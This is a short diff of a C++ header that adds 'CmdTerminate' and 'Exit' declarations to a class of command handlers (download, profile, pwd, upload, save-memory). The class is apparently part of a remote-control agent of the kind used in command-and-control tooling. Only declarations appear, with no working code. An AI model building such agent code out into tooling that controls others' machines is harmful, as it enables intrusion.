@@ -31,7 +31,10 @@ public:
 	void CmdDownloadState(ULONG commandId, Packer* inPacker, Packer* outPacker);
 	void CmdProfile(ULONG commandId, Packer* inPacker, Packer* outPacker);
 	void CmdPwd(ULONG commandId, Packer* inPacker, Packer* outPacker);
+	void CmdTerminate(ULONG commandId, Packer* inPacker, Packer* outPacker);
 	void CmdUpload(ULONG commandId, Packer* inPacker, Packer* outPacker);
 
 	void CmdSaveMemory(ULONG commandId, Packer* inPacker, Packer* outPacker);
+	void Exit(Packer* outPacker);
+
 };
